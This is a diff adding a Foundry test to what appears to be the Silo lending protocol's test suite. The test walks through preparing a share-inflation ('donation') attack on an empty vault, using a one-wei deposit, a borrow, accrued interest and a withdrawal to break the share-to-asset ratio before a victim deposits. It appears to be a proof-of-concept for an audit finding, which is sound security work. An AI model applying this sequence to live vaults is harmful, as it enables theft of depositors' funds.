@@ -61,6 +61,79 @@ contract DepositTest is SiloLittleHelper, Test {
     }
 
     /*
+    forge test -vv --ffi --mt test_vault_attack
+    */
+    function test_vault_attack() public {
+        address depositor = makeAddr("Depositor");
+        address borrower = makeAddr("Borrower");
+        ISiloConfig.ConfigData memory collateral = silo0.config().getConfig(address(silo0));
+        (,, address debtShareToken) = siloConfig.getShareTokens(address(silo0));
+
+
+        console.log("*** Vault is empty initially ***");
+        console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
+        console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
+        assertEq(IShareToken(collateral.collateralShareToken).totalSupply(), 0, "shares supply is zero");
+        assertEq(silo0.getCollateralAssets(), 0, "no assets deposited");
+        uint256 one = 1;
+
+        _makeDeposit(silo0, token0, one, depositor, ISilo.CollateralType.Collateral);
+
+        console.log("*** 1 share 1 asset ***");
+        console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
+        console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
+        assertEq(IShareToken(collateral.collateralShareToken).totalSupply(), one);
+        assertEq(silo0.getCollateralAssets(), one);
+
+        uint depositForBorrow = 1000*one;
+        uint toBorrow = 200*one;
+
+        _makeDeposit(silo0, token0, depositForBorrow, borrower, ISilo.CollateralType.Collateral);
+        vm.prank(borrower);
+        uint shares = silo0.borrowSameAsset(toBorrow, borrower, borrower);
+
+        uint256 timeForward = 70 days;
+        vm.warp(block.timestamp + timeForward);
+
+        uint256 toRepay = silo0.maxRepay(borrower);
+
+        assertTrue(toRepay > toBorrow);
+
+        vm.prank(borrower);
+        token0.approve(address(silo0), toRepay);
+
+        _mintTokens(token0, toRepay, borrower);
+
+        vm.prank(borrower);
+        shares = silo0.repay(toRepay, borrower);
+
+        // console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
+        // console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
+
+        (uint256 borrowerAssets) = silo0.maxWithdraw(borrower);
+        // console.log("borrowerAssets: ", borrowerAssets);
+
+        vm.prank(borrower);
+        silo0.withdraw(borrowerAssets, borrower, borrower);
+        console.log("*** Repay interest and withdraw to break 1:1 share-to-asset ratio for donation attack preparation ***");
+        console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
+        console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
+
+        _makeDeposit(silo0, token0, 500*one, depositor, ISilo.CollateralType.Collateral);
+        console.log("*** After first user deposits 500 ***");
+        console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
+        console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
+
+        // for (uint i = 0; i < 100; i++) {
+        //     _makeDeposit(silo0, token0, one, depositor, ISilo.CollateralType.Collateral);
+
+        //     console.log("For iteration ", i);
+        //     console.log("collateralShareToken.totalSupply() ", IShareToken(collateral.collateralShareToken).totalSupply());
+        //     console.log("silo0.getCollateralAssets() ", silo0.getCollateralAssets());
+        // }
+    }
+
+    /*
     forge test -vv --ffi --mt test_deposit_everywhere
     */
     function test_deposit_everywhere() public {
